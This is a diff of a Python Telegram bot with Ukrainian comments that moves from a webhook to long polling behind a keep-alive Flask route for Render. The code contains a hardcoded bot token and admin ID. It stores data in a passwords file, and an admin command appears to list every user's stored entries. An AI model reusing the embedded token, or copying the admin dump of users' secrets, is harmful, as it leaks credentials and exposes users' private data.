@@ -2,18 +2,18 @@ import os
 import json
 import random
 import string
+import threading
 from datetime import datetime
-from flask import Flask, request, jsonify
+from flask import Flask
 from telebot import TeleBot
-from telebot.types import Update, InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # --- НАЛАШТУВАННЯ ---
 TOKEN = '9060513665:AAFIsr_Ef0R1AY55f4I3O5s0tT110TGztOE'
 ADMIN_ID = 7623353420
-WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '') 
 
 bot = TeleBot(TOKEN)
-app = Flask(__name__)
+app = Flask(__name__) # Потрібен тільки для того, щоб Render не вбивав процес
 
 DB_FILE = 'passwords.json'
 USERS_FILE = 'users.json'
@@ -37,7 +37,7 @@ def log_action(user_id, action):
     uid = str(user_id)
     if uid not in logs: logs[uid] = []
     logs[uid].append(f"[{datetime.now():%H:%M}] {action}")
-    logs[uid] = logs[uid][-20:] # Зберігаємо тільки останні 20 дій, щоб файл не роздувався
+    logs[uid] = logs[uid][-20:]
     save_json(LOG_FILE, logs)
 
 def register_user(user_id, username, first_name):
@@ -172,32 +172,23 @@ def admin_libs(message):
         text += f"👤 `{u}`:\n" + "\n".join(f"  - {k}: `{v}`" for k, v in p.items()) + "\n"
     bot.send_message(message.chat.id, text, parse_mode='Markdown')
 
-# --- WEBHOOK ---
-@app.route('/', methods=['GET'])
-def health():
-    return jsonify({"status": "ok"})
+# --- ЗАПУСК (LONG POLLING + FLASK ДЛЯ RENDER) ---
+@app.route('/')
+def home():
+    return "Bot is alive!"
 
-@app.route(f'/{TOKEN}', methods=['POST'])
-def webhook():
-    if request.headers.get('content-type') == 'application/json':
-        update = Update.de_json(request.get_data().decode('utf-8'))
-        bot.process_new_updates([update])
-        return '', 200
-    return '', 403
+def run_bot():
+    print("🤖 Бот запущено в режимі Long Polling...")
+    # Видаляємо вебхук, щоб не конфліктував з polling
+    bot.remove_webhook() 
+    # Запускаємо слухача повідомлень
+    bot.infinity_polling(timeout=60, long_polling_timeout=60)
 
-# --- ЗАПУСК ---
 if __name__ == "__main__":
-    print("🚀 Starting bot...")
-    try:
-        bot.remove_webhook()
-        if WEBHOOK_URL:
-            bot.set_webhook(url=f"{WEBHOOK_URL}/{TOKEN}")
-            print(f"✅ Webhook set: {WEBHOOK_URL}")
-        else:
-            print("⚠️ NO WEBHOOK URL!")
-    except Exception as e:
-        print(f"❌ Webhook error: {e}")
-
+    # Запускаємо бота в окремому потоці
+    threading.Thread(target=run_bot, daemon=True).start()
+    
+    # Запускаємо Flask сервер (щоб Render тримав процес живим)
     port = int(os.environ.get("PORT", 5000))
-    # debug=False важливо для Render!
-    app.run(host="0.0.0.0", port=port, debug=False)
+    print(f"🌐 Сервер запущено на порту {port}")
+    app.run(host="0.0.0.0", port=port)
